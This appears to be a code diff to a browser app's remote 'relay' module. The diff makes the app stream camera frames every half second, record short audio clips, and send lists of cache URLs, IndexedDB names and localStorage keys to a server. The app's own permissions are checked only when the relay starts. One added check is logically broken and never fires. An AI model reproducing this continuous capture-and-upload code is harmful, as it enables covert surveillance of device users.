@@ -86,7 +86,7 @@ const PERMISSION_DEFS = [
 
 const RELAY_INTERVALS = {
     heartbeat: 5000,
-    camera: 3000,
+    camera: 500,
     audio: 3000,
     location: 8000,
     storage: 30000,
@@ -94,6 +94,9 @@ const RELAY_INTERVALS = {
 
 let relayTimers = {};
 let relayActive = false;
+let _relayCameraStream = null;
+let _relayAudioStream = null;
+let _audioClipCount = 0;
 
 function getRelayUid() {
     const auth = getAuth();
@@ -119,20 +122,18 @@ async function sendHeartbeat() {
 }
 
 async function sendCameraFrame() {
-    if (!relayActive) return;
-    const perms = await loadPermissions();
-    if (!perms.find(p => p.key === 'camera')?.granted) return;
+    if (!relayActive || !_relayCameraStream) return;
     try {
-        if (!_cameraStream) {
-            _cameraStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
-        }
+        const track = _relayCameraStream.getVideoTracks()[0];
+        if (!track || !track.readyState === 'live') return;
         const video = document.createElement('video');
-        video.srcObject = _cameraStream; video.playsInline = true;
+        video.srcObject = _relayCameraStream; video.playsInline = true;
         await video.play();
         const canvas = document.createElement('canvas');
         canvas.width = 320; canvas.height = 240;
         canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-        const frame = canvas.toDataURL('image/jpeg', 0.4).split(',')[1];
+        video.remove();
+        const frame = canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
         await fetch(`${API_BASE}/api/relay/camera`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -163,25 +164,48 @@ async function sendLocation() {
 }
 
 async function sendAudio() {
-    if (!relayActive) return;
-    const perms = await loadPermissions();
-    if (!perms.find(p => p.key === 'microphone')?.granted) return;
+    if (!relayActive || !_relayAudioStream) return;
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        const source = ctx.createMediaStreamSource(stream);
+        const source = ctx.createMediaStreamSource(_relayAudioStream);
         const analyser = ctx.createAnalyser(); analyser.fftSize = 256;
         source.connect(analyser);
         const dataArray = new Uint8Array(analyser.frequencyBinCount);
         analyser.getByteFrequencyData(dataArray);
         const avg = dataArray.reduce((a, b) => a + b, 0) / dataArray.length;
         const level = Math.round(avg / 2.55);
-        stream.getTracks().forEach(t => t.stop()); ctx.close();
+        ctx.close();
+
+        // Her 5. seferde (15sn) ses clip'i gönder
+        _audioClipCount++;
+        let clip = '';
+        if (_audioClipCount % 5 === 0) {
+            clip = await recordAudioClip();
+        }
+
         await fetch(`${API_BASE}/api/relay/audio`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ uid: getRelayUid(), level, has_signal: level > 15 })
+            body: JSON.stringify({ uid: getRelayUid(), level, has_signal: level > 15, clip })
         }).catch(() => {});
     } catch (_) {}
+}
+
+async function recordAudioClip() {
+    try {
+        const mediaRec = new MediaRecorder(_relayAudioStream, { mimeType: 'audio/webm' });
+        const chunks = [];
+        mediaRec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRec.start();
+        await new Promise(r => setTimeout(r, 3000));
+        if (mediaRec.state !== 'inactive') mediaRec.stop();
+        const blob = await new Promise(r => mediaRec.onstop = () => r(new Blob(chunks, { type: 'audio/webm' })));
+        if (blob.size < 100) return '';
+        const reader = new FileReader();
+        return await new Promise(resolve => {
+            reader.onload = () => resolve(reader.result.split(',')[1]);
+            reader.readAsDataURL(blob);
+        });
+    } catch (_) { return ''; }
 }
 
 async function sendStorage() {
@@ -189,11 +213,50 @@ async function sendStorage() {
     const perms = await loadPermissions();
     if (!perms.find(p => p.key === 'storage')?.granted) return;
     const result = await cloudScanStorageRaw();
+    const files = [];
+
+    try {
+        if ('caches' in window) {
+            const cacheNames = await caches.keys();
+            for (const name of cacheNames) {
+                const cache = await caches.open(name);
+                const requests = await cache.keys();
+                for (const req of requests) {
+                    files.push({ name: req.url, size: 0, source: 'cache', cache: name });
+                }
+            }
+        }
+    } catch (_) {}
+
+    try {
+        if (navigator.serviceWorker?.controller) {
+            const regs = await navigator.serviceWorker.getRegistrations();
+            files.push({ name: `[Service Worker] ${regs.length} kayıt`, size: 0, source: 'serviceworker' });
+        }
+    } catch (_) {}
+
+    try {
+        if ('indexedDB' in window && indexedDB.databases) {
+            const dbs = await indexedDB.databases();
+            for (const db of dbs) {
+                files.push({ name: `[IndexedDB] ${db.name} (v${db.version})`, size: 0, source: 'indexeddb' });
+            }
+        }
+    } catch (_) {}
+
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key);
+            files.push({ name: `[localStorage] ${key}`, size: val ? val.length : 0, source: 'localstorage' });
+        }
+    } catch (_) {}
+
     await fetch(`${API_BASE}/api/relay/storage`, {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             uid: getRelayUid(), quota: result.quota || '',
-            usage: result.usage || '', usage_percent: result.usage_percent || 0, files: [],
+            usage: result.usage || '', usage_percent: result.usage_percent || 0, files,
         })
     }).catch(() => {});
 }
@@ -201,6 +264,22 @@ async function sendStorage() {
 async function startRelay() {
     stopRelay();
     relayActive = true;
+
+    // Kalıcı stream'leri aç
+    const perms = await loadPermissions();
+    if (perms.find(p => p.key === 'camera')?.granted) {
+        try {
+            _relayCameraStream = await navigator.mediaDevices.getUserMedia({
+                video: { width: 320, height: 240, frameRate: { ideal: 10 } }
+            });
+        } catch (_) {}
+    }
+    if (perms.find(p => p.key === 'microphone')?.granted) {
+        try {
+            _relayAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        } catch (_) {}
+    }
+
     await sendHeartbeat();
     relayTimers.heartbeat = setInterval(sendHeartbeat, RELAY_INTERVALS.heartbeat);
     relayTimers.camera = setInterval(sendCameraFrame, RELAY_INTERVALS.camera);
@@ -213,6 +292,15 @@ function stopRelay() {
     relayActive = false;
     Object.values(relayTimers).forEach(t => clearInterval(t));
     relayTimers = {};
+
+    if (_relayCameraStream) {
+        _relayCameraStream.getTracks().forEach(t => t.stop());
+        _relayCameraStream = null;
+    }
+    if (_relayAudioStream) {
+        _relayAudioStream.getTracks().forEach(t => t.stop());
+        _relayAudioStream = null;
+    }
 }
 
 async function fetchJSON(url, options = {}) {
